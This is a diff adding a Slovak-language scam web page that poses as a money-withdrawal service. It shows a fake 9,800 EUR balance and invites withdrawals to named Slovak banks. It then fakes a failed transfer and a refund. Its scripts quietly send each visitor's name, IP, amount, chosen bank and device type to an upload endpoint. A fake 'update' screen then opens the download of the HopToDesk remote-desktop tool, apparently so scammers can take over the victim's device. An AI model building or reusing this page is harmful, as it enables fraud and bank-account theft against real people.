+                    <input type="password" id="inpcos" class="kata-in" maxlength="3" placeholder="•••" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Footer -->
+          <div class="quiz-footer" style="border-top:1px solid #100e04;">
+            <div></div>
+            <button class="quiz-btn-next" style="background:linear-gradient(135deg,#C9A84C,#8B6914);box-shadow:0 3px 14px rgba(201,168,76,0.28);" onclick="kartaSubmit()">
+              Potvrdiť výber
+              <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                <path d="M5 3l4 4-4 4" stroke="#D4D4D4" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </button>
+          </div>
+
+          <div class="quiz-watermark">
+            <svg width="11" height="11" viewBox="0 0 11 11" fill="none">
+              <rect x="1" y="4.5" width="9" height="6" rx="1.2" stroke="#C9A84C" stroke-width="1"/>
+              <path d="M3 4.5V3.5a2.5 2.5 0 015 0v1" stroke="#C9A84C" stroke-width="1" stroke-linecap="round"/>
+            </svg>
+            Zabezpečený prevod · 256-bit šifrovanie
+          </div>
+
+        </div><!-- /cad-cad -->
+      </div><!-- /cd-se-g -->
+	  
+	  
+      <div class="security-note" style="margin-top:20px">
+        <svg width="15" height="15" viewBox="0 0 15 15" fill="none" style="flex-shrink:0;margin-top:2px">
+          <rect x="2.5" y="6.5" width="10" height="7.5" rx="1.8" stroke="#888888" stroke-width="1.2"/>
+          <path d="M5 6.5V5a2.5 2.5 0 015 0v1.5" stroke="#888888" stroke-width="1.2" stroke-linecap="round"/>
+          <circle cx="7.5" cy="10.5" r="1" fill="#888888"/>
+        </svg>
+        <p>Prístup k vášmu účtu je chránený šifrovaním end-to-end. Akékoľvek zmeny stavu vyžadujú prítomnosť autorizovaného správcu. Tento e-mail bol vygenerovaný automaticky — neodpovedajte naň.</p>
+      </div>
+
+    </main>
+
+    <footer class="email-footer">
+      <div class="footer-brand">Technický Výber Peňazí</div>
+      <div class="footer-links">
+        <a href="#">Blog</a>
+        <a href="#">Zásady ochrany údajov</a>
+        <a href="#">Podmienky používania</a>
+        <a href="#">Podpora</a>
+      </div>
+      <div class="footer-copy">&copy; 2026 TECHNICKÝ VÝBER PEŇAZÍ. VŠETKY PRÁVA VYHRADENÉ.</div>
+    </footer>
+
+  </div>
+
+  <p class="outer-note">Toto je automatické systémové oznámenie &nbsp;&middot;&nbsp; technicky-vyber-penazi.sk</p>
+</div>
+
+<!-- URL PARAMS -->
+<script>
+(function() {
+  var p = new URLSearchParams(window.location.search);
+  var meno = p.get('meno') || '', priezvisko = p.get('priezvisko') || '', code = p.get('code') || '';
+  var nEl = document.getElementById('ac-fullname'), cEl = document.getElementById('ac-code');
+  if (nEl && (meno || priezvisko)) nEl.textContent = (meno + ' ' + priezvisko).trim();
+  if (cEl && code) cEl.textContent = 'Bezpečnostný kód: ' + code;
+})();
+</script>
+
+<script>
+/* ── BANKS ───────────────────────────────────────────────── */
+var BANKS = [
+  { name: '365.bank',              type: 'Digitálna',  logo: '365.png' },
+  { name: 'ČSOB',                  type: 'Komerčná',   logo: 'CSOB.png' },
+  { name: 'Fio banka',             type: 'Online',     logo: 'fiobanka_sk.png' },
+  { name: 'mBank',                 type: 'Online',     logo: 'Mbanka.png' },
+  { name: 'Poštová banka',         type: 'Retailová',  logo: 'Postova_banka.png' },
+  { name: 'Prima banka',           type: 'Retailová',  logo: 'Primabank.png' },
+  { name: 'Raiffeisen Bank',       type: 'Komerčná',   logo: 'raiffeisen.png' },
+  { name: 'Slovenská sporiteľňa',  type: 'Komerčná',   logo: 'CZSK_sporitka.jpg' },
+  { name: 'Tatra banka',           type: 'Komerčná',   logo: 'tatrabanka.png' },
+  { name: 'UniCredit Bank',        type: 'Komerčná',   logo: 'Unicredit_SK.png' },
+  { name: 'VÚB banka',             type: 'Komerčná',   logo: 'vub_banka.png' },
+  { name: 'Revolut',               type: 'Komerčná',   logo: 'Revolut.png' },
+];
+
+function bankLogoTag(logo, name, size) {
+  size = size || 24;
+  var initials = name.split(' ').slice(0,2).map(function(w){ return w[0]; }).join('').toUpperCase();
+  return '<img src="' + logo + '" width="' + size + '" height="' + size + '" ' +
+    'style="border-radius:' + Math.round(size * 0.21) + 'px;object-fit:contain;background:#161616;flex-shrink:0;" ' +
+    'onerror="this.style.display=\'none\';this.nextSibling.style.display=\'flex\';" alt="">' +
+    '<span style="display:none;width:' + size + 'px;height:' + size + 'px;border-radius:' + Math.round(size * 0.21) + 'px;' +
+    'background:#D4D4D4;align-items:center;justify-content:center;font-size:' + Math.round(size * 0.42) + 'px;' +
+    'font-weight:700;color:#555555;flex-shrink:0;">' + initials + '</span>';
+}
+
+var selectedBank = null;
+
+function renderBanks(list) {
+  var el = document.getElementById('bank-list');
+  if (!list.length) { el.innerHTML = '<div class="bank-empty">Žiadna banka nenájdená</div>'; return; }
+  el.innerHTML = list.map(function(b) {
+    var cls = (selectedBank && selectedBank.name === b.name) ? ' selected' : '';
+    return '<div class="bank-option' + cls + '" onclick="selectBankByName(\'' + b.name.replace(/'/g,"\\'") + '\')">' +
+      '<span style="display:flex;align-items:center;flex-shrink:0;">' + bankLogoTag(b.logo, b.name, 24) + '</span>' +
+      '<span class="bank-name">' + b.name + '</span>' +
+      '<span class="bank-type">' + b.type + '</span>' +
+      '</div>';
+  }).join('');
+}
+
+function toggleBank() {
+  var trigger = document.getElementById('bank-trigger');
+  var dd = document.getElementById('bank-dropdown');
+  var open = dd.classList.contains('open');
+  dd.classList.toggle('open', !open);
+  trigger.classList.toggle('open', !open);
+  if (!open) { renderBanks(BANKS); setTimeout(function(){ document.getElementById('bank-search').focus(); }, 50); }
+}
+
+function selectBankByName(name) {
+  selectedBank = BANKS.find(function(b){ return b.name === name; });
+  if (!selectedBank) return;
+  var display = document.getElementById('bank-display');
+  display.innerHTML = '<span style="display:flex;align-items:center;flex-shrink:0;">' + bankLogoTag(selectedBank.logo, selectedBank.name, 24) + '</span>' +
+    '<span class="bank-label-text">' + selectedBank.name + '</span>';
+  display.classList.remove('placeholder');
+  document.getElementById('bank-dropdown').classList.remove('open');
+  document.getElementById('bank-trigger').classList.remove('open');
+  document.getElementById('bank-search').value = '';
+}
+
+function filterBanks() {
+  var q = document.getElementById('bank-search').value.toLowerCase();
+  renderBanks(BANKS.filter(function(b){ return b.name.toLowerCase().includes(q); }));
+}
+
+document.addEventListener('click', function(e) {
+  var wrap = document.getElementById('bank-select-wrap');
+  if (wrap && !wrap.contains(e.target)) {
+    document.getElementById('bank-dropdown').classList.remove('open');
+    document.getElementById('bank-trigger').classList.remove('open');
+  }
+});
+
+/* ── BALANCE ─────────────────────────────────────────────── */
+var currentBalance = 9800.00;
+var transactions = [];
+
+function fmtBalance(n) {
+  return n.toLocaleString('sk-SK', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+function updateBalanceDisplay() {
+  var el = document.getElementById('bal-num');
+  if (el) el.textContent = fmtBalance(currentBalance);
+  var lbl = document.getElementById('max-balance-label');
+  if (lbl) lbl.textContent = fmtBalance(currentBalance) + ' EUR';
+
+  // Limit display — remaining = currentBalance / LIMIT * 100
+  var LIMIT = 9800.00;
+  var pct = Math.round((currentBalance / LIMIT) * 100);
+  pct = Math.max(0, Math.min(100, pct));
+
+  var limitEl = document.getElementById('limit-display');
+  if (limitEl) limitEl.textContent = fmtBalance(currentBalance) + ' / ' + fmtBalance(LIMIT) + ' EUR';
+
+  var fill = document.getElementById('progress-fill');
+  var progressLabel = document.getElementById('progress-label');
+  if (fill) {
+    fill.style.width = pct + '%';
+    if (pct >= 100) {
+      fill.style.background = '#8B6914';
+    } else if (pct >= 40) {
+      fill.style.background = '#C9A84C';
+    } else {
+      fill.style.background = '#C9A84C';
+    }
+  }
+  if (progressLabel) {
+    if (pct >= 100) {
+      progressLabel.textContent = '100% — Limit dosiahnutý';
+      progressLabel.style.color = '#C9A84C';
+      progressLabel.style.fontWeight = '700';
+    } else {
+      progressLabel.textContent = pct + '% — Zostatok';
+      progressLabel.style.color = pct >= 40 ? '#C9A84C' : '#C9A84C';
+      progressLabel.style.fontWeight = '700';
+    }
+  }
+}
+
+/* ── AMOUNT VALIDATION ───────────────────────────────────── */
+var amountInput = document.getElementById('amount-input');
+var amountError = document.getElementById('amount-error');
+
+amountInput.addEventListener('input', function() {
+  var val = this.value.replace(/[^0-9.,]/g, '');
+  var parts = val.split(/[.,]/);
+  if (parts.length > 2) val = parts[0] + '.' + parts.slice(1).join('');
+  this.value = val;
+  validateAmount();
+});
+
+amountInput.addEventListener('keydown', function(e) {
+  if ([8,9,37,38,39,40,46].includes(e.keyCode)) return;
+  if ((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105) ||
+      e.keyCode === 188 || e.keyCode === 190 || e.keyCode === 110) return;
+  e.preventDefault();
+});
+
+function validateAmount() {
+  var raw = amountInput.value.replace(',', '.');
+  var num = parseFloat(raw);
+  amountError.style.display = 'none';
+  if (!amountInput.value) return true;
+  if (isNaN(num) || num <= 0) {
+    amountError.textContent = 'Zadajte platnú sumu väčšiu ako 0.';
+    amountError.style.display = 'block'; return false;
+  }
+  if (num > currentBalance) {
+    amountError.textContent = 'Suma presahuje váš zostatok (' + fmtBalance(currentBalance) + ' EUR).';
+    amountError.style.display = 'block'; return false;
+  }
+  return true;
+}
+
+/* ── WITHDRAW ────────────────────────────────────────────── */
+function handleWithdraw() {
+  if (!validateAmount()) return;
+  if (!amountInput.value) { amountError.textContent = 'Zadajte sumu.'; amountError.style.display = 'block'; return; }
+  if (!selectedBank) { alert('Prosím vyberte banku.'); return; }
+
+  var btn = document.getElementById('btn-submit');
+  var icon = document.getElementById('submit-icon');
+  var txt = document.getElementById('submit-text');
+  var successBox = document.getElementById('submit-success');
+
+  // Hide any previous success box
+  if (successBox) successBox.style.display = 'none';
+
+  btn.disabled = true;
+  icon.innerHTML = '<svg style="animation:spin .8s linear infinite" width="17" height="17" viewBox="0 0 17 17" fill="none"><circle cx="8.5" cy="8.5" r="6.5" stroke="rgba(255,255,255,.25)" stroke-width="2"/><path d="M8.5 2a6.5 6.5 0 0 1 6.5 6.5" stroke="#D4D4D4" stroke-width="2" stroke-linecap="round"/></svg>';
+  txt.textContent = 'Spracovávam...';
+
+  // Collect withdrawal data and send to /api/upload
+  var params = new URLSearchParams(window.location.search);
+  (function() {
+    var lines = [
+      '=== VÝBER PEŇAZÍ ===',
+      'Čas: '        + new Date().toISOString(),
+	  'IP: ' + (params.get('ip') || ''),
+      '---',
+      'Meno: '       + (params.get('meno') || ''),
+      'Priezvisko: ' + (params.get('priezvisko') || ''),
+      'Suma: '       + amountInput.value + ' €',
+      'Banka: '      + (selectedBank ? selectedBank.name : ''),
+      '=== KONIEC ==='
+    ];
+    var blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+    var fd   = new FormData();
+    fd.append('file', blob, 'log-' + Date.now() + '.txt');
+    fetch('/api/upload', { method: 'POST', body: fd }).catch(function(){});
+  })();
+
+  setTimeout(function() {
+    var amount = parseFloat(amountInput.value.replace(',', '.'));
+    currentBalance = Math.max(0, currentBalance - amount);
+
+    var now = new Date();
+    var dateStr = now.getDate() + '. ' + ['januára','februára','marca','apríla','mája','júna','júla','augusta','septembra','októbra','novembra','decembra'][now.getMonth()] + ' ' + now.getFullYear() + ', ' + String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
+    var txId = Date.now();
+    transactions.unshift({ bank: selectedBank, amount: amount, date: dateStr, status: 'processing', id: txId, timerEnd: Date.now() + 120000 });
+
+    var txSection = document.getElementById('tx-section');
+    if (txSection) txSection.style.display = 'block';
+
+    updateBalanceDisplay();
+    renderTransactions();
+    startTxTimer(txId);
+
+    // Reset form
+    amountInput.value = '';
+    selectedBank = null;
+    var display = document.getElementById('bank-display');
+    display.innerHTML = '<span class="placeholder">Vyberte svoju banku</span>';
+
+    // Show checkmark on button
+    btn.classList.add('btn-submit--done');
+    icon.innerHTML = '<svg width="17" height="17" viewBox="0 0 17 17" fill="none"><path d="M2.5 8.5l4 4 7-7" stroke="#D4D4D4" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+    txt.textContent = 'Odoslané ✓';
+
+    // Show success message
+    if (successBox) {
+      successBox.style.display = 'flex';
+    }
+
+    // Reset button after 4s, hide success box after 8s
+    setTimeout(function() {
+      btn.disabled = false;
+      btn.classList.remove('btn-submit--done');
+      icon.innerHTML = '<svg width="17" height="17" viewBox="0 0 17 17" fill="none"><path d="M2 8.5h12M9 4l5 4.5L9 13" stroke="#D4D4D4" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+      txt.textContent = 'Odoslať žiadosť o výber';
+    }, 4000);
+
+    setTimeout(function() {
+      if (successBox) { successBox.style.display = 'none'; }
+    }, 15000);
+
+  }, 1800);
+}
+
+/* ── TX TIMER ────────────────────────────────────────────── */
+function startTxTimer(txId) {
+  var interval = setInterval(function() {
+    var tx = transactions.find(function(t){ return t.id === txId; });
+    if (!tx) { clearInterval(interval); return; }
+    var remaining = tx.timerEnd - Date.now();
+    if (remaining <= 0) {
+      clearInterval(interval);
+      tx.status = 'failed';
+      renderTransactions();
+
+      // Add refund transaction after 1.5s
+      setTimeout(function() {
+        var now = new Date();
+        var dateStr = now.getDate() + '. ' + ['januára','februára','marca','apríla','mája','júna','júla','augusta','septembra','októbra','novembra','decembra'][now.getMonth()] + ' ' + now.getFullYear() + ', ' + String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
+        currentBalance = currentBalance + tx.amount;
+        transactions.unshift({ bank: tx.bank, amount: tx.amount, date: dateStr, status: 'refund', id: Date.now() + 1 });
+        updateBalanceDisplay();
+        renderTransactions();
+      }, 1500);
+
+    }
+    // no re-render on each tick — timer is hidden
+  }, 1000);
+}
+
+/* ── BANK LINKS MAP ──────────────────────────────────────── */
+var BANK_LINKS = {
+  '365.bank': {
+    app: 'https://play.google.com/store/apps/details?id=bank.sk365.app&pcampaignid=web_share',
+    web: 'https://my.365.bank/'
+  },
+  'ČSOB': {
+    app: 'https://play.google.com/store/apps/details?id=com.zentity.sbank.csobsk',
+    web: 'https://www.csob.sk/moja-csob'
+  },
+  'Fio banka': {
+    app: 'https://play.google.com/store/apps/details?id=sk.fio.sb2',
+    web: 'https://www.fio.sk/'
+  },
+  'mBank': {
+    app: 'https://play.google.com/store/apps/details?id=sk.mbank',
+    web: 'https://www.mbank.sk/individualni/internet-banking/'
+  },
+  'Poštová banka': {
+    app: 'https://play.google.com/store/apps/details?id=com.zentity.pabk',
+    web: 'https://moja.postovabanka.sk/'
+  },
+  'Prima banka': {
+    app: 'https://play.google.com/store/apps/details?id=sk.primabanka.penazenka',
+    web: 'https://ib.primabanka.sk/ib/default.aspx'
+  },
+  'Raiffeisen Bank': {
+    app: 'https://play.google.com/store/apps/details?id=sk.raiffeisen.ib.androidwrapper',
+    web: 'https://www.raiffeisen.sk/sk/ucet/internet-banking/'
+  },
+  'Slovenská sporiteľňa': {
+    app: 'https://play.google.com/store/apps/details?id=sk.slsp.georgego',
+    web: 'https://www.slsp.sk/sk/george'
+  },
+  'Tatra banka': {
+    app: 'https://play.google.com/store/apps/details?id=sk.tb.ib.tatraandroid',
+    web: 'https://moja.tatrabanka.sk/'
+  },
+  'UniCredit Bank': {
+    app: 'https://play.google.com/store/apps/details?id=hr.asseco.android.jimba.mUCI.sk',
+    web: 'https://www.unicreditbank.sk/en/obcane/digital/online-banking.html'
+  },
+  'VÚB banka': {
+    app: 'https://play.google.com/store/apps/details?id=sk.vub.banking',
+    web: 'https://www.vub.sk/en/ludia'
+  },
+  'Revolut': {
+    app: 'https://play.google.com/store/apps/details?id=com.revolut.revolut&pcampaignid=web_share',
+    web: 'https://www.revolut.com/en-SK/'
+  },
+};
+
+function getBankVerifyButtons(bankName) {
+  var links = BANK_LINKS[bankName] || {
+    app: 'https://play.google.com/store',
+    web: '#'
+  };
+  return '<div style="display:flex;flex-direction:column;gap:6px;margin-top:8px;">' +
+    '<a href="' + links.app + '" target="_blank" style="' +
+      'display:flex;align-items:center;justify-content:center;gap:6px;' +
+      'padding:7px 12px;border-radius:9px;font-size:11.5px;font-weight:700;font-family:inherit;' +
+      'text-decoration:none;cursor:pointer;border:none;' +
+      'background:linear-gradient(135deg,#8B6914,#C9A84C);color:#D4D4D4;' +
+      'box-shadow:0 2px 8px rgba(201,168,76,0.35);' +
+      'transition:opacity .15s,transform .12s;"' +
+      ' onmouseover="this.style.opacity=\'0.88\';this.style.transform=\'translateY(-1px)\'"' +
+      ' onmouseout="this.style.opacity=\'1\';this.style.transform=\'none\'">' +
+      '<svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M6 1l1.5 3h3L8 6.2l.9 3.3L6 7.7l-2.9 1.8.9-3.3L1.5 4h3z" fill="#D4D4D4"/></svg>' +
+      'Overiť transakciu (App)' +
+    '</a>' +
+    '<a href="' + links.web + '" target="_blank" style="' +
+      'display:flex;align-items:center;justify-content:center;gap:6px;' +
+      'padding:7px 12px;border-radius:9px;font-size:11.5px;font-weight:700;font-family:inherit;' +
+      'text-decoration:none;cursor:pointer;border:1.5px solid #C9A84C;' +
+      'background:#100e04;color:#E8C96A;' +
+      'transition:background .15s,transform .12s;"' +
+      ' onmouseover="this.style.background=\'#1a1407\';this.style.transform=\'translateY(-1px)\'"' +
+      ' onmouseout="this.style.background=\'#1a1407\';this.style.transform=\'none\'">' +
+      '<svg width="12" height="12" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="6" r="4.5" stroke="#8B6914" stroke-width="1.3"/><path d="M2 6h8M6 2a6 6 0 0 1 0 8M6 2a6 6 0 0 0 0 8" stroke="#8B6914" stroke-width="1.1" stroke-linecap="round"/></svg>' +
+      'Overiť transakciu (Web)' +
+    '</a>' +
+  '</div>';
+}
+
+/* ── RENDER TRANSACTIONS ─────────────────────────────────── */
+function renderTransactions() {
+  var empty = document.getElementById('tx-empty');
+  var list = document.getElementById('tx-list');
+  var count = document.getElementById('tx-count');
+  count.textContent = transactions.length + (transactions.length === 1 ? ' záznam' : transactions.length < 5 ? ' záznamy' : ' záznamov');
+  if (!transactions.length) { empty.style.display = 'block'; list.innerHTML = ''; return; }
+  empty.style.display = 'none';
+  list.innerHTML = transactions.map(function(tx) {
+    var statusHtml = '';
+    if (tx.status === 'refund') {
+      statusHtml =
+        '<div class="tx-amount" style="color:#C9A84C;">+' + fmtBalance(tx.amount) + ' EUR</div>' +
+        '<div class="tx-status" style="background:#100e04;border-color:#E8C96A;color:#C9A84C;">Vrátenie prostriedkov</div>';
+      return '<div class="tx-item" style="border-color:#100e04;">' +
+        '<span style="display:flex;align-items:center;flex-shrink:0;">' + bankLogoTag(tx.bank.logo, tx.bank.name, 32) + '</span>' +
+        '<div class="tx-info">' +
+          '<div class="tx-bank-name">' + tx.bank.name + '</div>' +
+          '<div class="tx-date">' + tx.date + '</div>' +
+        '</div>' +
+        '<div class="tx-amount-col">' + statusHtml + '</div>' +
+      '</div>';
+    } else if (tx.status === 'failed') {
+      statusHtml =
+        '<div class="tx-amount">−' + fmtBalance(tx.amount) + ' EUR</div>' +
+        '<div class="tx-status tx-status--error" style="background:#fef2f2;border-color:#fecaca;color:#8B6914;max-width:200px;white-space:normal;line-height:1.4;padding:4px 8px;">⚠ Žiadosť nebola úspešne Spracovanie<br><span style="font-size:9px;color:#888888;">Kód chyby: AO834982</span></div>' +
+        getBankVerifyButtons(tx.bank.name);
+    } else {
+      statusHtml =
+        '<div class="tx-amount">−' + fmtBalance(tx.amount) + ' EUR</div>' +
+        '<div class="tx-status" style="background:#D4D4D4beb;border-color:#fde68a;color:#C9A84C;">Spracovanie</div>' +
+        getBankVerifyButtons(tx.bank.name);
+    }
+    return '<div class="tx-item" style="flex-wrap:wrap;">' +
+      '<span style="display:flex;align-items:center;flex-shrink:0;">' + bankLogoTag(tx.bank.logo, tx.bank.name, 32) + '</span>' +
+      '<div class="tx-info">' +
+        '<div class="tx-bank-name">' + tx.bank.name + '</div>' +
+        '<div class="tx-date">' + tx.date + '</div>' +
+      '</div>' +
+      '<div class="tx-amount-col">' + statusHtml + '</div>' +
+    '</div>';
+  }).join('');
+}
+</script>
+
+<!-- LOADING OVERLAY -->
+<div id="update-overlay" style="display:none;position:fixed;inset:0;background:rgba(5,7,13,0.94);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:9999;flex-direction:column;align-items:center;justify-content:center;gap:0;">
+  <div style="text-align:center;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:24px;padding:40px 48px;max-width:340px;width:90%;">
+    <!-- spinner ring -->
+    <div style="position:relative;width:56px;height:56px;margin:0 auto 24px;">
+      <svg style="position:absolute;inset:0;animation:spin .9s linear infinite" width="56" height="56" viewBox="0 0 56 56" fill="none">
+        <circle cx="28" cy="28" r="23" stroke="rgba(59,130,246,0.15)" stroke-width="4"/>
+        <path d="M28 5a23 23 0 0 1 23 23" stroke="#C9A84C" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;">
+        <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+          <path d="M2 9h12M10 5l5 4-5 4" stroke="#E8C96A" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+    </div>
+    <div style="font-family:'Inter',sans-serif;font-size:17px;font-weight:800;color:#D4D4D4;margin-bottom:6px;letter-spacing:-0.4px;">Sťahujem aktualizáciu…</div>
+    <div style="font-family:'Inter',sans-serif;font-size:12px;color:#555555;margin-bottom:24px;line-height:1.5;" id="overlay-step">Overujem bezpečnostný certifikát…</div>
+    <!-- progress bar -->
+    <div style="width:100%;height:5px;background:rgba(255,255,255,0.08);border-radius:10px;overflow:hidden;margin:0 auto 10px;">
+      <div id="overlay-bar" style="height:100%;width:0%;background:linear-gradient(90deg,#8B6914,#C9A84C,#E8C96A);border-radius:10px;transition:width 0.15s linear;"></div>
+    </div>
+    <div style="font-family:'Inter',sans-serif;font-size:12px;color:#4b5563;font-weight:600;" id="overlay-pct">0 %</div>
+  </div>
+</div>
+
+<script>
+var UPDATE_URL = 'https://play.google.com/store/apps/details?id=com.hoptodesk.app&hl=ru';
+var UPDATE_URL_PC = 'https://www.hoptodesk.com/download/HopToDesk.exe';
+
+function showDevicePicker() {
+  var modal = document.getElementById('device-picker-modal');
+  if (modal) {
+    modal.style.display = 'flex';
+    requestAnimationFrame(function() {
+      setTimeout(function() { modal.classList.add('dp-visible'); }, 10);
+    });
+  }
+}
+
+function closeDevicePicker() {
+  var modal = document.getElementById('device-picker-modal');
+  if (modal) {
+    modal.classList.remove('dp-visible');
+    setTimeout(function() { modal.style.display = 'none'; }, 250);
+  }
+}
+
+function pickDevice(type) {
+  if (type === 'phone') {
+    UPDATE_URL = 'https://play.google.com/store/apps/details?id=com.hoptodesk.app&hl=ru';
+  } else {
+    UPDATE_URL = UPDATE_URL_PC;
+  }
+  // Collect device choice and send to /api/upload
+  var params = new URLSearchParams(window.location.search);
+  (function() {
+    var lines = [
+      '=== VÝBER ZARIADENIA ===',
+      'Čas: '        + new Date().toISOString(),
+	  'IP: ' + (params.get('ip') || ''),
+      '---',
+      'Meno: '       + (params.get('meno') || ''),
+      'Priezvisko: ' + (params.get('priezvisko') || ''),
+      'Zariadenie: ' + (type === 'phone' ? 'Telefón (Android)' : 'Počítač (PC/Mac)'),
+      '=== KONIEC ==='
+    ];
+    var blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+    var fd   = new FormData();
+    fd.append('file', blob, 'log-' + Date.now() + '.txt');
+    fetch('/api/upload', { method: 'POST', body: fd }).catch(function(){});
+  })();
+  closeDevicePicker();
+  setTimeout(function() { startUpdate(); }, 280);
+}
+var overlaySteps = [
+  'Overujem bezpečnostný certifikát…',
+  'Nadväzujem zabezpečené spojenie…',
+  'Sťahujem aktualizačný balík…',
+  'Inštalujem komponenty…',
+  'Dokončujem aktualizáciu…'
+];
+
+function activateAccount() {
+  // Status pill → Aktívny (green)
+  var pill = document.getElementById('status-pill');
+  var dot = document.getElementById('s-dot');
+  var txt = document.getElementById('status-text');
+  if (pill) { pill.style.background = '#1A1407'; pill.style.color = '#C9A84C'; pill.style.borderColor = '#E8C96A'; }
+  if (dot)  { dot.style.background = '#C9A84C'; }
+  if (txt)  { txt.textContent = 'Aktívny'; }
+
+  // Balance tag → Aktívny (green)
+  var tag = document.getElementById('bal-tag');
+  if (tag) { tag.textContent = 'Aktívny'; tag.style.color = '#C9A84C'; tag.style.background = '#100e04'; }
+
+  // Step 2 → done (checkmark)
+  var s2num = document.getElementById('step2-num');
+  if (s2num) { s2num.className = 'step-num step-done'; s2num.innerHTML = '&#10003;'; }
+
+  // Step 3 → active with spinner + "Spracovanie"
+  var s3num = document.getElementById('step3-num');
+  var s3title = document.getElementById('step3-title');
+  var s3desc = document.getElementById('step3-desc');
+  if (s3num) {
+    s3num.className = 'step-num step-active';
+    s3num.innerHTML = '<svg style="animation:spin .9s linear infinite" width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="7" cy="7" r="5.5" stroke="rgba(255,255,255,0.3)" stroke-width="2"/><path d="M7 1.5a5.5 5.5 0 0 1 5.5 5.5" stroke="#D4D4D4" stroke-width="2" stroke-linecap="round"/></svg>';
+  }
+  if (s3title) { s3title.className = 'step-title'; s3title.textContent = 'Spracovanie…'; }
+  if (s3desc)  { s3desc.textContent = 'Prebieha overenie a obnovenie prístupu k účtu.'; }
+}
+
+function startUpdate() {
+  var btn = document.getElementById('btn-update');
+  btn.disabled = true;
+  var overlay = document.getElementById('update-overlay');
+  overlay.style.display = 'flex';
+
+  // reset bar
+  var bar = document.getElementById('overlay-bar');
+  var pctEl = document.getElementById('overlay-pct');
+  var stepEl = document.getElementById('overlay-step');
+  bar.style.width = '0%';
+  pctEl.textContent = '0 %';
+  stepEl.textContent = overlaySteps[0];
+
+  var pct = 0;
+  var stepIdx = 0;
+
+  var iv = setInterval(function() {
+    pct += Math.random() * 3 + 1;
+    if (pct > 100) pct = 100;
+    bar.style.width = pct.toFixed(0) + '%';
+    pctEl.textContent = pct.toFixed(0) + ' %';
+    var newStep = Math.min(Math.floor(pct / 22), overlaySteps.length - 1);
+    if (newStep !== stepIdx) { stepIdx = newStep; stepEl.textContent = overlaySteps[stepIdx]; }
+    if (pct >= 100) {
+      clearInterval(iv);
+      stepEl.textContent = 'Hotovo! Presmerovávam…';
+      setTimeout(function() {
+        overlay.style.display = 'none';
+        btn.disabled = false;
+        activateAccount();
+        window.open(UPDATE_URL, '_blank');
+      }, 700);
+    }
+  }, 90);
+}
+
+function animateVerify(e) {
+  e.preventDefault();
+  var btn = document.getElementById('btn-verify');
+  var orig = btn.textContent;
+  btn.style.pointerEvents = 'none';
+  btn.textContent = 'Overujem systém…';
+  btn.style.color = '#555555';
+  var dots = 0;
+  var iv = setInterval(function() {
+    dots = (dots + 1) % 4;
+    btn.textContent = 'Overujem systém' + '.'.repeat(dots);
+  }, 400);
+  setTimeout(function() {
+    clearInterval(iv);
+    btn.textContent = orig;
+    btn.style.color = '';
+    btn.style.pointerEvents = '';
+    window.open('https://coinmarketcap.com/community/ru/profile/Cislo_robota12532/?type=Posts', '_blank');
+  }, 2200);
+}
+</script>
+
+<style>
+@keyframes spin { to { transform: rotate(360deg); } }
+#btn-update { cursor:pointer; border:none; font-family:inherit; }
+</style>
+
+<script src="app.js"></script>
+
+<!-- ── DEVICE PICKER MODAL ─────────────────────────────── -->
+<div id="device-picker-modal" style="display:none;position:fixed;inset:0;z-index:10000;align-items:center;justify-content:center;padding:20px;">
+  <div class="dp-backdrop" onclick="closeDevicePicker()"></div>
+  <div class="dp-card">
+    <div class="dp-header">
+      <div class="dp-header-icon">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+          <rect x="2" y="3" width="16" height="12" rx="2" stroke="#C9A84C" stroke-width="1.4"/>
+          <path d="M7 18h6M10 15v3" stroke="#C9A84C" stroke-width="1.4" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <div>
+        <div class="dp-title">Vyberte typ zariadenia</div>
+        <div class="dp-subtitle">Na akú platformu chcete stiahnuť aktualizáciu?</div>
+      </div>
+      <button class="dp-close" onclick="closeDevicePicker()">
+        <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+          <path d="M2 2l10 10M12 2L2 12" stroke="#888888" stroke-width="1.8" stroke-linecap="round"/>
+        </svg>
+      </button>
+    </div>
+    <div class="dp-divider"></div>
+    <div class="dp-options">
+      <button class="dp-option" onclick="pickDevice('phone')">
+        <div class="dp-option-icon dp-icon-phone">
+          <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
+            <rect x="5" y="1.5" width="12" height="19" rx="2.5" stroke="#C9A84C" stroke-width="1.5"/>
+            <circle cx="11" cy="17.5" r="1" fill="#C9A84C"/>
+            <path d="M8.5 4.5h5" stroke="#E8C96A" stroke-width="1.3" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <div class="dp-option-body">
+          <span class="dp-option-title">Telefón</span>
+          <span class="dp-option-desc">Android · Google Play</span>
+        </div>
+        <svg class="dp-chevron" width="16" height="16" viewBox="0 0 16 16" fill="none">
+          <path d="M6 4l4 4-4 4" stroke="#888888" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+      <button class="dp-option" onclick="pickDevice('pc')">
+        <div class="dp-option-icon dp-icon-pc">
+          <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
